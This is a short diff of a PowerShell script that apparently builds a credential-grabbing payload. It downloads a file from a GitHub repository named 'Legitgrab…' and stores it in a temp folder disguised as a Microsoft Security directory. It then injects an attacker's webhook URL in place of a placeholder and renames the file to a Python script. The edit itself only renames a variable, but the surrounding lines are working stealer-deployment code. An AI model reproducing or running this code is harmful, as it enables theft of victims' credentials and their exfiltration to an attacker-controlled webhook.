@@ -166,7 +166,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab
 $file = "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt"
 $targetString = "WillBeReplaceBiUrWebHook"
 $text = Get-Content $file
-$newText = $text -replace $targetString, $webhook
+$newText = $text -replace $targetString, $webhookurl
 $newText | Set-Content $file
 Rename-Item -Path $file -NewName "SecurityKeys.py"
 #I don't use chatGPT 
